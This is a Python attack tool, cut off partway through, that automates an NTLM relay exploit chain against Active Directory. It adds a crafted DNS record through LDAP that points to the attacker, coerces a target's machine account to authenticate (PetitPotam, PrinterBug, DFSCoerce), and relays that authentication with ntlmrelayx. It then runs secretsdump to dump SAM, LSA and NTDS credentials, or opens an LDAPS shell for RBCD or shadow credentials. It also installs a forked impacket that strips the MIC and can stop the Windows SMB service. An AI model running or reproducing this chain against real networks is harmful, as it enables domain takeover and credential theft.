#!/usr/bin/env python3
"""
smb_no_signing_gg — Debug & Protocol Trace Build
─────────────────────────────────────────────────
NTLM relay exploit chain with full protocol-level tracing
across LDAP, DNS, SMB, and RPC.

Cross-platform: works on Linux (Kali) and Windows (PowerShell).
"""
import sys
import os
import platform
import argparse
import subprocess
import time
import socket
import shutil
import threading
import signal
import ctypes
from pathlib import Path
from datetime import datetime

IS_WINDOWS = os.name == "nt"

# ═══════════════════════════════════════════════
# Windows ANSI support
# ═══════════════════════════════════════════════
def enable_ansi_windows():
    """Enable VT100 escape sequences in Windows Terminal / cmd."""
    if not IS_WINDOWS:
        return
    try:
        kernel32 = ctypes.windll.kernel32
        # STD_OUTPUT_HANDLE = -11
        handle = kernel32.GetStdHandle(-11)
        mode = ctypes.c_ulong()
        kernel32.GetConsoleMode(handle, ctypes.byref(mode))
        # ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
        kernel32.SetConsoleMode(handle, mode.value | 0x0004)
    except Exception:
        pass

enable_ansi_windows()

# ═══════════════════════════════════════════════
# ANSI Colors
# ═══════════════════════════════════════════════
class C:
    RST    = "\033[0m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    MAG    = "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BG_RED = "\033[41m"
    LDAP = CYAN
    SMB  = BLUE
    RPC  = MAG
    DNS  = YELLOW
    OK   = GREEN
    FAIL = RED
    WARN = YELLOW

DEBUG = True
CHAIN_LOG = []

def ts():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]

def log(proto, direction, msg, color=C.WHITE):
    if not DEBUG:
        return
    proto_colors = {"LDAP": C.LDAP, "SMB": C.SMB, "RPC": C.RPC, "DNS": C.DNS,
                    "RELAY": C.BLUE, "INFO": C.WHITE, "OK": C.OK,
                    "FAIL": C.FAIL, "WARN": C.WARN, "FLOW": C.DIM}
    pc = proto_colors.get(proto, C.WHITE)
    arrows = {">>": f"{C.GREEN}\u2192{C.RST}", "<<": f"{C.YELLOW}\u2190{C.RST}",
              "!!": f"{C.RED}\u2717{C.RST}", "ok": f"{C.GREEN}\u2713{C.RST}",
              "..": f"{C.DIM}\u00b7{C.RST}"}
    arrow = arrows.get(direction, " ")
    print(f"  {C.DIM}{ts()}{C.RST} {pc}[{proto:>5}]{C.RST} {arrow} {color}{msg}{C.RST}")

def log_step(num, title):
    print(f"\n{C.BOLD}{C.WHITE}{'='*60}{C.RST}")
    print(f"  {C.BOLD}{C.WHITE}STEP {num}: {title}{C.RST}")
    print(f"{C.BOLD}{C.WHITE}{'='*60}{C.RST}")

def log_result(step_name, passed, detail=""):
    status = "PASS" if passed else "FAIL"
    CHAIN_LOG.append((step_name, passed, detail))
    c = C.OK if passed else C.FAIL
    print(f"  {c}{C.BOLD}[{status}]{C.RST} {c}{step_name}{C.RST}", end="")
    if detail:
        print(f" {C.DIM}({detail}){C.RST}", end="")
    print()

def log_params(params: dict):
    for k, v in params.items():
        print(f"  {C.DIM}  {k}:{C.RST} {C.WHITE}{v}{C.RST}")

def check_port(host, port, timeout=3):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def check_tool(name):
    """Check for a tool on PATH. On Windows also check the venv Scripts dir."""
    path = shutil.which(name)
    if not path and IS_WINDOWS:
        # Check venv Scripts directory for .exe variants
        script_dir = Path(__file__).parent.absolute()
        venv_scripts = script_dir / "venv" / "Scripts"
        for suffix in ["", ".exe", ".cmd", ".bat"]:
            candidate = venv_scripts / f"{name}{suffix}"
            if candidate.exists():
                path = str(candidate)
                break
    if path:
        log("INFO", "ok", f"{name} found at {path}")
    else:
        log("WARN", "!!", f"{name} NOT on PATH", C.RED)
    return path

def port_scan(ip, label):
    log("INFO", "..", f"Port check on {C.BOLD}{label}{C.RST} ({ip})")
    ports = {88: "Kerberos", 135: "RPC/EFSRPC", 139: "NetBIOS", 389: "LDAP",
             445: "SMB", 636: "LDAPS", 3268: "GC", 3269: "GC-SSL"}
    for port, svc in ports.items():
        up = check_port(ip, port)
        c = C.OK if up else C.DIM
        tag = "OPEN" if up else "closed"
        proto = "SMB" if port == 445 else ("LDAP" if port in (389,636) else ("RPC" if port == 135 else "INFO"))
        log(proto, "ok" if up else "..", f"{ip}:{port} ({svc}): {c}{tag}{C.RST}")

def print_flow_diagram(args):
    coerce_target = args.coerce_target
    relay_target = args.relay_target
    dc = args.dns_ip
    attacker = args.attacker_ip
    method_rpc = {"PetitPotam": "MS-EFSRPC", "Printerbug": "MS-RPRN", "DFSCoerce": "MS-DFSNM"}.get(args.method, "RPC")

    print(f"\n{C.BOLD}{C.WHITE}{'='*60}{C.RST}")
    print(f"  {C.BOLD}{C.WHITE}EXPECTED PROTOCOL FLOW{C.RST}")
    print(f"{C.BOLD}{C.WHITE}{'='*60}{C.RST}")
    print()
    print(f"  {C.CYAN}Step 1  [LDAP]{C.RST}  Attacker ({attacker})")
    print(f"         {C.GREEN}{'=' * 30}>{C.RST} DC ({dc})")
    print(f"         Authenticated LDAP bind, then add DNS A record")
    print(f"         pointing {C.YELLOW}{STATIC_DNS_RECORD}{C.RST}")
    print(f"         to attacker IP {C.WHITE}{attacker}{C.RST}")
    print()
    print(f"  {C.YELLOW}Step 2  [DNS]{C.RST}   Attacker ({attacker})")
    print(f"         {C.GREEN}{'=' * 30}>{C.RST} DC ({dc})")
    print(f"         DNS query to confirm A record resolves")
    print()
    print(f"  {C.BLUE}Step 3  [SMB]{C.RST}   ntlmrelayx binds :445 on attacker")
    print(f"         Waits for inbound NTLM authentication")
    print()
    print(f"  {C.MAG}Step 4  [RPC]{C.RST}   Attacker ({attacker})")
    print(f"         {C.GREEN}{'=' * 30}>{C.RST} Target ({coerce_target})")
    print(f"         nxc coerce_plus triggers {method_rpc}")
    print(f"         Target's machine account authenticates back")
    print(f"         to the DNS name, which resolves to attacker")
    print()
    print(f"  {C.BLUE}Step 5  [SMB]{C.RST}   Target ({coerce_target})")
    print(f"         {C.YELLOW}{'=' * 30}>{C.RST} Attacker :445")
    print(f"         {C.BOLD}Inbound NTLM auth (machine account hash){C.RST}")
    print(f"         {C.RED}This is the step that fails silently most often.{C.RST}")
    print(f"         If this never arrives, the coercion or DNS is broken.")
    print()
    print(f"  {C.BLUE}Step 6  [SMB]{C.RST}   Attacker (ntlmrelayx)")
    print(f"         {C.GREEN}{'=' * 30}>{C.RST} Relay target ({relay_target})")
    print(f"         Forwards captured NTLM auth to relay target")
    print(f"         {C.RED}Fails if: signing required, session expired, same host{C.RST}")
    print()
    print(f"  {C.BLUE}Step 7  [SMB]{C.RST}   Relay target ({relay_target})")
    print(f"         {C.YELLOW}{'=' * 30}>{C.RST} Attacker (ntlmrelayx)")
    print(f"         Authenticated session established")
    print(f"         ntlmrelayx runs secretsdump (SAM/LSA/NTDS)")
    print(f"         {C.RED}Fails if: relayed account lacks admin on target{C.RST}")
    print()


# ═══════════════════════════════════════════════
# Port 445 conflict handling (Windows)
# ═══════════════════════════════════════════════
def check_and_free_port_445():
    """On Windows, port 445 is bound by LanmanServer. Detect and offer to stop it."""
    if not IS_WINDOWS:
        return

    if not check_port("127.0.0.1", 445):
        return  # Port is free already

    log("SMB", "!!", f"{C.BG_RED}{C.WHITE} Port 445 is bound by Windows SMB service (LanmanServer) {C.RST}", C.RED)
    log("SMB", "..", "ntlmrelayx needs port 445. The Windows SMB server must be stopped.", C.YELLOW)

    # Check if we're elevated
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        is_admin = False

    if not is_admin:
        log("FAIL", "!!", "Run this script as Administrator to stop LanmanServer.", C.RED)
        log("FAIL", "..", "In an elevated PowerShell: net stop LanmanServer /y", C.YELLOW)
        log("FAIL", "..", "To restore after: net start LanmanServer", C.YELLOW)
        sys.exit(1)

    log("SMB", ">>", "Attempting to stop LanmanServer service...")
    try:
        result = subprocess.run(
            ["net", "stop", "LanmanServer", "/y"],
            capture_output=True, text=True, timeout=30
        )
        time.sleep(2)  # Give it a moment to release the port

        if not check_port("127.0.0.1", 445):
            log("SMB", "ok", "LanmanServer stopped, port 445 is now free", C.GREEN)
            log("SMB", "..", "Remember to restart it after: net start LanmanServer", C.YELLOW)
            log_result("Free port 445", True, "LanmanServer stopped")
        else:
            log("SMB", "!!", "Port 445 is still bound after stopping LanmanServer", C.RED)
            log("SMB", "..", "Another service may hold it. Check with: netstat -ano | findstr :445", C.YELLOW)
            log_result("Free port 445", False, "port still bound")
            sys.exit(1)
    except Exception as e:
        log("FAIL", "!!", f"Failed to stop LanmanServer: {e}", C.RED)
        sys.exit(1)


# ═══════════════════════════════════════════════
# Connection monitor (background thread)
# ═══════════════════════════════════════════════
class ConnectionMonitor(threading.Thread):
    """Watches for inbound connections on port 445.
    Uses 'ss' on Linux, 'netstat' on Windows."""
    def __init__(self):
        super().__init__(daemon=True)
        self.stop_event = threading.Event()
        self.seen = set()

    def _get_connections_linux(self):
        """Use ss on Linux to find established connections on sport 445."""
        try:
            result = subprocess.run(
                ["ss", "-tn", "state", "established", "sport", "=", "445"],
                capture_output=True, text=True, timeout=3
            )
            peers = []
            for line in result.stdout.strip().splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 5:
                    peers.append(parts[4])
            return peers
        except Exception:
            return []

    def _get_connections_windows(self):
        """Use netstat on Windows to find established connections on local port 445."""
        try:
            result = subprocess.run(
                ["netstat", "-an"],
                capture_output=True, text=True, timeout=5
            )
            peers = []
            for line in result.stdout.splitlines():
                line = line.strip()
                if "ESTABLISHED" in line and ":445" in line:
                    parts = line.split()
                    # netstat format: Proto  Local Address  Foreign Address  State
                    if len(parts) >= 4:
                        local_addr = parts[1]
                        # Only match if our local side is :445
                        if local_addr.endswith(":445"):
                            peers.append(parts[2])
            return peers
        except Exception:
            return []

    def run(self):
        get_conns = self._get_connections_windows if IS_WINDOWS else self._get_connections_linux
        while not self.stop_event.is_set():
            for peer in get_conns():
                if peer not in self.seen:
                    self.seen.add(peer)
                    log("SMB", "<<", f"{C.GREEN}{C.BOLD}INBOUND CONNECTION from {peer}{C.RST}", C.GREEN)
            self.stop_event.wait(2)

    def stop(self):
        self.stop_event.set()


# ═══════════════════════════════════════════════
# Packet capture (background, cross-platform)
# ═══════════════════════════════════════════════
class PacketCapture:
    """tcpdump on Linux, tshark on Windows."""
    def __init__(self, interface=None, outfile=None, ports=None):
        self.proc = None
        self.ports = ports or [445, 135, 389, 636, 88]

        if IS_WINDOWS:
            self.tool = "tshark"
            self.interface = interface or "Ethernet"
            self.outfile = outfile or os.path.join(os.environ.get("TEMP", "C:\\Temp"), "smb_relay_capture.pcapng")
        else:
            self.tool = "tcpdump"
            self.interface = interface or "any"
            self.outfile = outfile or "/tmp/cve33073_capture.pcap"

    def start(self):
        tool_path = shutil.which(self.tool)
        if not tool_path:
            log("WARN", "!!", f"{self.tool} not found, skipping packet capture", C.YELLOW)
            if IS_WINDOWS:
                log("WARN", "..", "Install Wireshark to get tshark: https://www.wireshark.org", C.YELLOW)
            return False

        port_filter = " or ".join(f"port {p}" for p in self.ports)

        if IS_WINDOWS:
            # tshark capture filter syntax
            cmd = [tool_path, "-i", self.interface, "-w", self.outfile, "-f", port_filter]
        else:
            cmd = [self.tool, "-i", self.interface, "-w", self.outfile, "-s", "0", port_filter]

        try:
            self.proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            log("INFO", "ok", f"{self.tool} running (PID {self.proc.pid}), saving to {self.outfile}", C.GREEN)
            return True
        except Exception as e:
            log("WARN", "!!", f"{self.tool} failed to start: {e}", C.YELLOW)
            return False

    def stop(self):
        if self.proc:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.proc.kill()
            log("INFO", "ok", f"Packet capture saved to {C.BOLD}{self.outfile}{C.RST}")


# ═══════════════════════════════════════════════
# Relay output monitor (background thread)
# ═══════════════════════════════════════════════
class RelayMonitor(threading.Thread):
    """Reads ntlmrelayx stdout/stderr in real time, parses key events."""

    STAGE_WAITING       = 0
    STAGE_LISTENING     = 1
    STAGE_CALLBACK      = 2
    STAGE_RELAY_AUTH    = 3
    STAGE_DUMP_STARTED  = 4
    STAGE_DUMP_SUCCESS  = 5
    STAGE_LDAP_SHELL    = 6

    STAGE_NAMES = {
        0: "Waiting for ntlmrelayx to start",
        1: "Listener ready, waiting for callback",
        2: "Callback received (NTLM auth inbound)",
        3: "Relay authenticated on target",
        4: "Secretsdump running",
        5: "SAM/secrets dumped successfully",
        6: "LDAP interactive shell opened",
    }

    def __init__(self, proc, is_ldaps_mode=False):
        super().__init__(daemon=True)
        self.proc = proc
        self.is_ldaps_mode = is_ldaps_mode
        self.stage = self.STAGE_WAITING
        self.stop_event = threading.Event()
        self.errors = []
        self.lines = []

    def _advance(self, new_stage, detail=""):
        if new_stage > self.stage:
            self.stage = new_stage
            log("RELAY", "ok", f"{C.GREEN}{C.BOLD}Stage -> {self.STAGE_NAMES[new_stage]}{C.RST}", C.GREEN)
            if detail:
                log("RELAY", "..", detail)

    def _parse_line(self, line):
        low = line.lower()
        self.lines.append(line)

        color = C.WHITE
        proto = "RELAY"

        if "error" in low or "denied" in low or "failed" in low or "refused" in low:
            color = C.RED
        elif "success" in low or "authenticated" in low or "dumping" in low:
            color = C.GREEN
        elif "warning" in low:
            color = C.YELLOW

        log(proto, "<<", f"{color}{line}{C.RST}")

        if "servers started" in low or "setting up smb server" in low:
            self._advance(self.STAGE_LISTENING)
        elif "smbd-thread" in low or "authenticate_message" in low or "received connection" in low or "connection from" in low:
            self._advance(self.STAGE_CALLBACK, "NTLM callback arrived from coerced target")
        elif "authenticating against" in low:
            log("RELAY", ">>", f"Forwarding captured auth to relay target...")
        elif "authenticated successfully" in low or "succeed" in low:
            self._advance(self.STAGE_RELAY_AUTH, "Relay target accepted the forwarded NTLM auth")
        elif "dumping" in low or "remote operations" in low or "secretsdump" in low:
            self._advance(self.STAGE_DUMP_STARTED, "secretsdump is running against relay target")
        elif "sam hashes" in low or ":::" in line:
            self._advance(self.STAGE_DUMP_SUCCESS, "Credentials extracted")
        elif "interactive" in low and ("ldap" in low or "smb" in low or "shell" in low):
            self._advance(self.STAGE_LDAP_SHELL, "Connect with: nc 127.0.0.1 11000")

        if "access_denied" in low or "access is denied" in low or "status_access_denied" in low:
            self.errors.append("ACCESS_DENIED")
            log("RELAY", "!!", f"{C.BG_RED}{C.WHITE} Relay target returned ACCESS DENIED {C.RST}")
            if self.stage >= self.STAGE_RELAY_AUTH:
                log("RELAY", "..", "Relay auth worked but secretsdump was blocked (likely AV/EDR or not admin).", C.YELLOW)
                log("RELAY", "..", "Try --socks mode and connect manually with smbclient.py or nxc.", C.YELLOW)
        elif "signature" in low and ("required" in low or "signing" in low):
            self.errors.append("SIGNING_REQUIRED")
            log("RELAY", "!!", f"{C.BG_RED}{C.WHITE} Relay rejected: SMB signing required {C.RST}")
        elif "ldap server returned error" in low or "ldap error" in low:
            self.errors.append("LDAP_REJECTED")
            log("RELAY", "!!", f"{C.BG_RED}{C.WHITE} LDAP relay rejected (signing or channel binding enforced) {C.RST}")
        elif "connection refused" in low or "connection reset" in low:
            self.errors.append("CONNECTION_REFUSED")

    def run(self):
        try:
            for line in iter(self.proc.stdout.readline, b''):
                if self.stop_event.is_set():
                    break
                decoded = line.decode(errors="replace").rstrip()
                if decoded:
                    self._parse_line(decoded)
        except Exception:
            pass
        try:
            for line in iter(self.proc.stderr.readline, b''):
                if self.stop_event.is_set():
                    break
                decoded = line.decode(errors="replace").rstrip()
                if decoded:
                    self._parse_line(decoded)
        except Exception:
            pass

    def stop(self):
        self.stop_event.set()

    def get_diagnosis(self):
        diag = []
        if self.stage == self.STAGE_WAITING:
            diag.append(("ntlmrelayx never started", C.RED))
        elif self.stage == self.STAGE_LISTENING:
            diag.append(("No NTLM callback ever arrived on port 445", C.RED))
            diag.append(("The coercion failed silently, or the DNS record is pointing to the wrong IP.", C.YELLOW))
            diag.append(("Verify with: nslookup <record> DC_IP", C.DIM))
        elif self.stage == self.STAGE_CALLBACK:
            diag.append(("Callback arrived but relay auth failed", C.RED))
            if "SIGNING_REQUIRED" in self.errors:
                diag.append(("Relay target requires SMB signing. Use --smb-signing-is-on or pick a different target.", C.YELLOW))
            elif "LDAP_REJECTED" in self.errors:
                diag.append(("DC rejected LDAP relay. LDAP signing or channel binding is enforced.", C.YELLOW))
            else:
                diag.append(("The relay target may have rejected the auth for unknown reasons. Check output above.", C.YELLOW))
        elif self.stage == self.STAGE_RELAY_AUTH:
            diag.append(("Relay auth SUCCEEDED but no dump/shell appeared", C.YELLOW))
            if "ACCESS_DENIED" in self.errors:
                diag.append(("secretsdump got ACCESS DENIED. Relay worked but the machine account is not admin,", C.YELLOW))
                diag.append(("or AV/EDR blocked the SAM dump. The relay itself is still a valid finding.", C.YELLOW))
                diag.append(("Try: re-run with --socks, then use proxychains smbclient.py to confirm admin access.", C.CYAN))
            else:
                diag.append(("The session may have timed out before secretsdump could run.", C.YELLOW))
        elif self.stage == self.STAGE_DUMP_STARTED:
            diag.append(("secretsdump started but did not complete", C.YELLOW))
            if "ACCESS_DENIED" in self.errors:
                diag.append(("Partial access: dump was blocked mid-way, likely by EDR.", C.YELLOW))
                diag.append(("The relay and admin access are confirmed. Use --socks for manual PoC.", C.CYAN))
            else:
                diag.append(("Connection may have dropped. Try again or use --socks.", C.YELLOW))
        elif self.stage == self.STAGE_DUMP_SUCCESS:
            diag.append(("Full success: credentials were dumped.", C.GREEN))
        elif self.stage == self.STAGE_LDAP_SHELL:
            diag.append(("LDAPS relay worked. Interactive LDAP shell is open.", C.GREEN))
            diag.append(("Connect with: nc 127.0.0.1 11000", C.CYAN))
            diag.append(("From there you can set up RBCD or shadow credentials.", C.CYAN))
        return diag


# ═══════════════════════════════════════════════
# Venv / dependency logic (cross-platform)
# ═══════════════════════════════════════════════
def ensure_venv():
    script_dir = Path(__file__).parent.absolute()
    venv_dir = script_dir / "venv"

    if IS_WINDOWS:
        venv_python = venv_dir / "Scripts" / "python.exe"
        sp_pattern = "Lib/site-packages"
    else:
        venv_python = venv_dir / "bin" / "python3"
        sp_pattern = "lib/python3.*"

    in_venv = (hasattr(sys, 'real_prefix') or
               (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix))

    if not in_venv:
        if IS_WINDOWS:
            sp = venv_dir / "Lib" / "site-packages"
            if sp.exists() and str(sp) not in sys.path:
                sys.path.insert(0, str(sp))
        else:
            for py_dir in venv_dir.glob("lib/python3.*"):
                sp = py_dir / "site-packages"
                if sp.exists() and str(sp) not in sys.path:
                    sys.path.insert(0, str(sp))
                    break

    try:
        import ldap3
    except ImportError:
        print(f"{C.RED}[!] ldap3 not found. Run setup.ps1 (Windows) or setup.sh (Linux){C.RST}")
        sys.exit(1)

    return str(venv_python) if venv_python.exists() else sys.executable


def find_ntlmrelayx():
    """Find whichever ntlmrelayx binary is on PATH or in the venv."""
    names = ["impacket-ntlmrelayx", "ntlmrelayx.py", "ntlmrelayx"]
    if IS_WINDOWS:
        names = ["impacket-ntlmrelayx.exe", "ntlmrelayx.exe", "impacket-ntlmrelayx", "ntlmrelayx.py", "ntlmrelayx"]

    for name in names:
        if shutil.which(name):
            return name

    # Check venv Scripts on Windows
    if IS_WINDOWS:
        script_dir = Path(__file__).parent.absolute()
        venv_scripts = script_dir / "venv" / "Scripts"
        for name in ["impacket-ntlmrelayx.exe", "ntlmrelayx.exe"]:
            candidate = venv_scripts / name
            if candidate.exists():
                return str(candidate)

    return None

VENV_PYTHON = ensure_venv()
STATIC_DNS_RECORD = "localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"


def ensure_forked_impacket():
    script_dir = Path(__file__).parent.absolute()

    if IS_WINDOWS:
        venv_python = script_dir / "venv" / "Scripts" / "python.exe"
    else:
        venv_python = script_dir / "venv" / "bin" / "python3"

    if not venv_python.exists():
        print(f"{C.RED}[!] venv not found. Run setup.ps1 (Windows) or setup.sh (Linux){C.RST}")
        sys.exit(1)

    try:
        result = subprocess.run(
            [str(venv_python), "ntlmrelayx.py", "--help"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and "--remove-mic-partial" in result.stdout:
            log("INFO", "ok", "Forked impacket with --remove-mic-partial available", C.GREEN)
            return True
    except:
        pass

    log("INFO", ">>", "Installing forked impacket (decoder-it/impacket-partial-mic)...")
    try:
        subprocess.run(
            [str(venv_python), "-m", "pip", "install", "--upgrade",
             "git+https://github.com/decoder-it/impacket-partial-mic.git#egg=impacket"],
            check=True, capture_output=True, text=True
        )
        log("INFO", "ok", "Forked impacket installed", C.GREEN)
        return True
    except subprocess.CalledProcessError as e:
        log("FAIL", "!!", f"Forked impacket install failed: {e.stderr[:200]}", C.RED)
        return False


# ═══════════════════════════════════════════════
# Step 1: DNS record via LDAP
# ═══════════════════════════════════════════════
def run_dnstool(user, password, attacker_ip, dns_ip, dc_fqdn):
    log_step(1, "ADD DNS RECORD VIA LDAP")

    log("LDAP", ">>", f"Authenticating to DC {C.BOLD}{dc_fqdn}{C.RST} as {C.BOLD}{user}{C.RST}")
    log("LDAP", ">>", f"Adding A record: {C.YELLOW}{STATIC_DNS_RECORD}{C.RST} -> {C.WHITE}{attacker_ip}{C.RST}")
    log("DNS", "..", f"DNS server for the update: {dns_ip}")

    script_dir = Path(__file__).parent.absolute()
    dnstool_path = script_dir / "dnstool.py"

    if not dnstool_path.exists():
        log("FAIL", "!!", f"dnstool.py not found at {dnstool_path}", C.RED)
        log_result("DNS record addition", False, "dnstool.py missing")
        sys.exit(1)

    cmd = [
        sys.executable, str(dnstool_path),
        "-u", user, "-p", password,
        "-a", "add", "-r", STATIC_DNS_RECORD,
        "-d", attacker_ip, "-dns-ip", dns_ip,
        dc_fqdn
    ]
    log("LDAP", ">>", f"cmd: {' '.join(cmd[:4])} ... {' '.join(cmd[10:])}")

    try:
        result = subprocess.run(cmd, check=True, capture_output=True, text=True, timeout=30)
        stdout = result.stdout.strip()
        stderr = result.stderr.strip()

        if stdout:
            for line in stdout.splitlines():
                log("LDAP", "<<", line)
        if stderr:
            for line in stderr.splitlines():
                log("LDAP", "<<", f"{C.YELLOW}{line}{C.RST}")

        if "already exists" in (stdout + stderr).lower():
            log("WARN", "!!", "Record already exists. This is OK if it points to your attacker IP.", C.YELLOW)
            log("WARN", "..", "If it points elsewhere, delete it first with dnstool -a remove", C.YELLOW)
            log_result("DNS record addition", True, "record already existed")
        else:
            log("LDAP", "ok", "DNS record added via LDAP successfully", C.GREEN)
            log_result("DNS record addition", True)

    except subprocess.CalledProcessError as e:
        log("LDAP", "!!", f"dnstool FAILED (rc={e.returncode})", C.RED)
        if e.stdout:
            for line in e.stdout.strip().splitlines():
                log("LDAP", "!!", line, C.RED)
        if e.stderr:
            for line in e.stderr.strip().splitlines():
                log("LDAP", "!!", line, C.RED)

        combined = (e.stdout or "") + (e.stderr or "")
        if "invalid credentials" in combined.lower():
            log("FAIL", "!!", f"{C.BG_RED}{C.WHITE} LDAP bind failed: bad username or password {C.RST}", C.RED)
        elif "connection refused" in combined.lower() or "unreachable" in combined.lower():
            log("FAIL", "!!", f"{C.BG_RED}{C.WHITE} Cannot reach DC on LDAP (389/636). Firewall? {C.RST}", C.RED)
        elif "access denied" in combined.lower() or "insufficient" in combined.lower():
            log("FAIL", "!!", f"{C.BG_RED}{C.WHITE} User lacks permission to add DNS records {C.RST}", C.RED)

        log_result("DNS record addition", False, "dnstool error")
        # sys.exit(1)
    except subprocess.TimeoutExpired:
        log("LDAP", "!!", "dnstool timed out (30s). DC may be unreachable.", C.RED)
        log_result("DNS record addition", False, "timeout")
        sys.exit(1)


# ═══════════════════════════════════════════════
# Step 2: DNS propagation check (cross-platform)
# ═══════════════════════════════════════════════
def dns_resolve(record, dns_ip):
    """Resolve a DNS record using dnspython (cross-platform, no dig needed)."""
    try:
        import dns.resolver
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [dns_ip]
        resolver.lifetime = 5
        answers = resolver.resolve(record, "A")
        return [str(rdata) for rdata in answers]
    except Exception:
        pass

    # Fallback: try dig on Linux, nslookup on Windows
    if IS_WINDOWS:
        try:
            result = subprocess.run(
                ["nslookup", record, dns_ip],
                capture_output=True, text=True, timeout=5
            )
            # Parse nslookup output for Address lines after the server section
            lines = result.stdout.strip().splitlines()
            addresses = []
            past_server = False
            for line in lines:
                if "Name:" in line:
                    past_server = True
                if past_server and "Address" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        addr = parts[-1].strip()
                        if addr and addr != dns_ip:
                            addresses.append(addr)
            return addresses if addresses else None
        except Exception:
            return None
    else:
        try:
            result = subprocess.run(
                ["dig", "+short", record, f"@{dns_ip}"],
                capture_output=True, text=True, timeout=5
            )
            resolved = result.stdout.strip()
            return [resolved] if resolved else None
        except Exception:
            return None


def wait_for_dns_record(record, dns_ip, timeout=60):
    log_step(2, "DNS PROPAGATION CHECK")
    timeout = int(timeout)

    log("DNS", ">>", f"Querying {C.BOLD}{dns_ip}{C.RST} for {C.YELLOW}{record}{C.RST}")
    log("DNS", "..", f"Timeout: {timeout}s, polling every 2s")

    start_time = time.time()
    attempts = 0
    while time.time() - start_time < timeout:
        attempts += 1
        elapsed = time.time() - start_time

        addresses = dns_resolve(record, dns_ip)
        if addresses:
            resolved = ", ".join(addresses)
            log("DNS", "<<", f"Resolved to {C.GREEN}{C.BOLD}{resolved}{C.RST} (attempt {attempts}, {elapsed:.1f}s)")
            log_result("DNS propagation", True, f"{resolved} after {elapsed:.1f}s")
            return True
        else:
            if attempts <= 3 or attempts % 5 == 0:
                log("DNS", "<<", f"Not yet (attempt {attempts}, {elapsed:.1f}s)", C.DIM)

        time.sleep(2)

    log("DNS", "!!", f"Record never resolved after {timeout}s / {attempts} attempts", C.RED)
    log("FAIL", "!!", f"{C.BG_RED}{C.WHITE} DNS propagation failed. The coercion callback won't reach you. {C.RST}")
    log("FAIL", "..", "Common causes: record not actually added, LDAP auth worked but update was rejected,", C.RED)
    log("FAIL", "..", "or the DC's DNS zone doesn't allow dynamic updates from this user.", C.RED)
    log_result("DNS propagation", False, "timeout")
    return False


# ═══════════════════════════════════════════════
# Step 3: ntlmrelayx listener
# ═══════════════════════════════════════════════
def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False,
                      dc_ip=None, dc_fqdn=None, dns_ip=None):
    log_step(3, "START NTLMRELAYX LISTENER")

    # On Windows, handle port 445 conflict
    check_and_free_port_445()

    # Pre-flight: is 445 already in use?
    if check_port("127.0.0.1", 445):
        log("SMB", "!!", f"{C.BG_RED}{C.WHITE} Port 445 is ALREADY BOUND on this host! {C.RST}", C.RED)
        log("SMB", "!!", "ntlmrelayx will fail to bind. Kill whatever is using 445 first.", C.RED)
        if IS_WINDOWS:
            log("SMB", "..", "Run: netstat -ano | findstr :445", C.YELLOW)
        else:
            log("SMB", "..", "Run: sudo ss -tlnp sport = 445", C.YELLOW)
        log_result("ntlmrelayx bind :445", False, "port conflict")
        sys.exit(1)
    else:
        log("SMB", "ok", "Port 445 is free on attacker (good)", C.GREEN)

    if smb_signing:
        ldaps_target = dc_ip or dc_fqdn or dns_ip
        if not ldaps_target.startswith("ldaps://"):
            ldaps_target = f"ldaps://{ldaps_target}"

        log("RELAY", ">>", f"Mode: {C.MAG}{C.BOLD}SMB signing bypass (--remove-mic){C.RST}")
        log("RELAY", ">>", f"Relay target: {C.BOLD}{ldaps_target}{C.RST} (LDAPS)")
        log("LDAP", "..", "Relay will forward captured NTLM auth to DC over LDAPS")

        ldaps_host = ldaps_target.replace("ldaps://", "")
        if check_port(ldaps_host, 636):
            log("LDAP", "ok", f"{ldaps_host}:636 (LDAPS) is reachable", C.GREEN)
        else:
            log("LDAP", "!!", f"{ldaps_host}:636 (LDAPS) is NOT reachable", C.RED)
            log_result("LDAPS reachability", False, f"{ldaps_host}:636 closed")

        relay_bin = find_ntlmrelayx()
        if not relay_bin:
            log("FAIL", "!!", "No ntlmrelayx binary found on PATH or in venv", C.RED)
            log_result("ntlmrelayx binary", False, "not found")
            sys.exit(1)
        log("SMB", "ok", f"Using relay binary: {relay_bin}")

        cmd = [
            sys.executable, relay_bin, "-t", ldaps_target,
            "--no-multirelay", "-i", "-smb2support",
            "--remove-mic", "--keep-relaying"
        ]
    else:
        log("RELAY", ">>", f"Mode: {C.BLUE}{C.BOLD}Standard SMB relay{C.RST}")
        log("RELAY", ">>", f"Relay target: {C.BOLD}{target}{C.RST}")

        relay_host = target
        for prefix in ["smb://", "ldaps://", "ldap://", "http://", "https://"]:
            relay_host = relay_host.replace(prefix, "")
        relay_host = relay_host.split("/")[0]

        if check_port(relay_host, 445):
            log("SMB", "ok", f"Relay target {relay_host}:445 is reachable", C.GREEN)
        else:
            log("SMB", "!!", f"Relay target {relay_host}:445 is NOT reachable. Relay will fail!", C.RED)
            log_result("Relay target reachability", False, f"{relay_host}:445 closed")

        log("SMB", ">>", f"Checking SMB signing on relay target {relay_host}...")
        nxc_bin = check_tool("nxc")
        if nxc_bin:
            try:
                sr = subprocess.run([nxc_bin, "smb", relay_host], capture_output=True, text=True, timeout=15)
                for line in sr.stdout.strip().splitlines():
                    log("SMB", "<<", line)
                    low = line.lower().replace(" ", "")
                    if "signing:true" in low:
                        log("SMB", "!!", f"{C.BG_RED}{C.WHITE} SMB SIGNING IS ON. Relay to this target will be rejected! {C.RST}")
